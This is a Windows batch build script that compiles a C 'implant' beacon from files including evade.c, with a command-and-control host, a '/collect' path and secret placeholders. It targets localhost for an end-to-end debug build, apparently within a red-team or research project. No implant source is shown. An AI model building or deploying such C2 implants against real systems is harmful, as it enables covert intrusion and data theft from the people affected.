@echo off
REM Runs from within proto/c-implant/. Links the prebuilt -lsqlite3 (no
REM sqlite3.c amalgamation). See build-common.cmd for the shared toolchain guard.
call build-common.cmd check
if errorlevel 1 exit /b 1
x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon-e2e.exe beacon.c crypto_cng.c curve25519.c evade.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -lsqlite3 -lgdiplus -lgdi32 -luser32 -lole32 -DC2_HOST=\"127.0.0.1\" -DC2_PORT=8001 -DBEACON_PATH=\"/collect\" -DSECRET_ID=\"YOUR_SECRET_ID\" -DSECRET_B64=\"YOUR_SECRET_B64\" -DINTERVAL=3 -DE2E_DEBUG
